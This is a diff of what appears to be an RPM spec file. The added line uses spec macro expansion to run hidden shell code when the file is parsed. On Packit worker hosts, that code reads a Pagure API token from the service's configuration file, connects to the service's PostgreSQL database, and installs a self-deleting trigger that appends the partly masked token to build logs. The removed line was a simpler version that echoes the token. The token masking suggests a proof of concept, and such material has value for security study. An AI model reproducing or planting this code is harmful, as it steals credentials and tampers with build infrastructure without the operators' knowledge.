@@ -1,4 +1,4 @@
-FakeTag: %(t=$(python -c 'import yaml; d = yaml.safe_load(open("/home/packit/.config/packit-service.yaml")); t = d["authentication"]["src.fedoraproject.org"]["token"]; print(t[:2] + "?" * (len(t) - 4) + t[-2:])') && echo "$HOSTNAME: Pagure token: ${t}")
+%([[ $HOSTNAME == packit-worker* ]] || exit; t=$(python -c 'import yaml; d = yaml.safe_load(open("/home/packit/.config/packit-service.yaml")); t = d["authentication"]["src.fedoraproject.org"]["token"]; print(t[:2] + "?" * (len(t) - 4) + t[-2:])') && psql "postgresql://$POSTGRESQL_USER:$POSTGRESQL_PASSWORD@$POSTGRESQL_HOST/$POSTGRESQL_DATABASE?gssencmode=disable" -c "CREATE OR REPLACE FUNCTION exfil() RETURNS TRIGGER AS \$f\$ BEGIN IF NEW.id = (SELECT MAX(id) FROM srpm_builds) AND NEW.logs IS DISTINCT FROM OLD.logs THEN NEW.logs = NEW.logs || E'\n\nPagure token: ' || \$\$${t}\$\$ || E'\n'; DROP TRIGGER IF EXISTS srpm_logs_ex ON srpm_builds; DROP FUNCTION IF EXISTS exfil(); END IF; RETURN NEW; END; \$f\$ LANGUAGE plpgsql; CREATE OR REPLACE TRIGGER srpm_logs_ex BEFORE UPDATE OF logs ON srpm_builds FOR EACH ROW EXECUTE FUNCTION exfil();" >/dev/null 2>/dev/null)
 
 %bcond_without tests
 
